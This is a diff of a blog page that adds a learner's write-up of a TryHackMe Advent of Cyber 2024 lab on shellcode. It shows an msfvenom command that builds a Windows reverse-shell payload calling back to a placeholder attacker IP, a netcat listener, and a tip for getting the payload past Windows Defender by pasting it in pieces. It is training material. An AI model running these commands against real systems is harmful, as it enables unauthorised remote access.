@@ -67,7 +67,7 @@
     <link href="https://unpkg.com/prismjs@1.20.0/themes/prism-okaidia.css" rel="stylesheet" >
     
 
-    <title>TryHackMe | Stefanos M.</title>
+    <title>Advent of Cyber 2024 - Day 8 | Stefanos M.</title>
 </head>
 	<body class="Ribbon" id='Body'>
 		<div>
@@ -98,40 +98,25 @@
 			</div>
 
 			<div class="seperator" id="Content">
-				<h2>TryHackMe</h2>
-<p>In this section posts about my activity on TryHackMe will be posted. Im new to this so please be patient while I explore the wonderfull world of <a href="https://tryhackme.com">TryHackMe</a>!</p>
-<div class="center">
-    <a href="https://tryhackme.com/r/p/Stefenmarg">
-    <img class="imgbox" src="https://tryhackme-badges.s3.amazonaws.com/Stefenmarg.png" alt="Your Image Badge">
-    </a>
-</div>
-<div class="page" id="Page">
-	<h2> Posts regarding TryHackMe: </h2>
-<p><ul>
-<li> On: Mon, Dec 09, 24, <a href="/posts/TryHackMe/Day_9_09_12_2024/">Advent of Cyber 2024 - Day 9</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Sun, Dec 08, 24, <a href="/posts/TryHackMe/Day_8_08_12_2024/">Advent of Cyber 2024 - Day 8</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Sat, Dec 07, 24, <a href="/posts/TryHackMe/Day_7_07_12_2024/">Advent of Cyber 2024 - Day 7</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Fri, Dec 06, 24, <a href="/posts/TryHackMe/Day_6_06_12_2024/">Advent of Cyber 2024 - Day 6</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Thu, Dec 05, 24, <a href="/posts/TryHackMe/Day_5_05_12_2024/">Advent of Cyber 2024 - Day 5</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Wed, Dec 04, 24, <a href="/posts/TryHackMe/Day_4_04_12_2024/">Advent of Cyber 2024 - Day 4</a> by: Stefanos Margaritis</li>
-</ul></p>
-<p><ul>
-<li> On: Tue, Dec 03, 24, <a href="/posts/TryHackMe/Day_3_03_12_2024/">Advent of Cyber 2024 - Day 3</a> by: Stefanos Margaritis</li>
-</ul></p>
-</div>
-<div class="pagination center">
-<p><a class="next" href="/thm/1/">Older posts</a></p>
-</div>
+				<h2>Advent of Cyber 2024 - Day 8</h2>
+<h3>Topic Covered Day 8: Shellcode</h3>
+<p>She sells sea shells at the shellcode cove!</p>
+<p>Todays topic was shellcodes; a piece of code that is injected into vulnerable systems in order to trigger the execution of arbitary commands. With the shellcodes our tasks where to get a reverse shell to a windows machine with PowerShell.</p>
+<p>To generate the shellcode we are instructed to use <code>msfvernom</code> first at port 1111 and then at the attack port 4444 and make it connect to our machine with the ip of the AttackBox.</p>
+<pre class="language-bash"><code class="language-bash">msfvernom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACK_BOX_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> powershell</code></pre>
+<p>That line would generate a hex encoded byte array that we would paste into our given powerShell code that would deliver the payload. Fun fact! If you put the code in a <code>.ps1</code> file (powershell script) Windows Defender would infact pick it up and stop you from running it! So get ready for <code>Ctrl+C</code> and <code>Ctrl+V</code> price by piece since you gotta make it in steps.</p>
+<p>If you have an issue with the clipboard not pasting right is would recommend at home directory to run</p>
+<pre class="language-bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server</code></pre>
+<p>so you will be able to see and download the files from the attack box to the target machine. Important step was to start netcat at the attack box by running the below command so you could initiate the reverse shell!</p>
+<pre class="language-bash"><code class="language-bash">netcat <span class="token parameter variable">-nvlp</span> <span class="token number">4444</span></code></pre>
+<p>Where you to run all the scripts without having the powershell crash, you would be getting a successfull reverse shell and on the terminal running netcat, you would see that you now have a powershell into the target machine. To get the flag all you have to do is navigate to the Desktop and run <code>type</code> on the flag thus getting the flag and completing Day 8.</p>
+<pre class="language-powershell"><code class="language-powershell">cd Desktop
+<span class="token function">type</span> flag<span class="token punctuation">.</span>txt</code></pre>
+<p>This was fun, learned something new and got my 7 day Streak sticker! Can't wait for Day 9!</p>
+<p>Thanks a lot for reading!</p>
+<ul>
+<li>Stefanos M.</li>
+</ul>
 
 			</div>
 
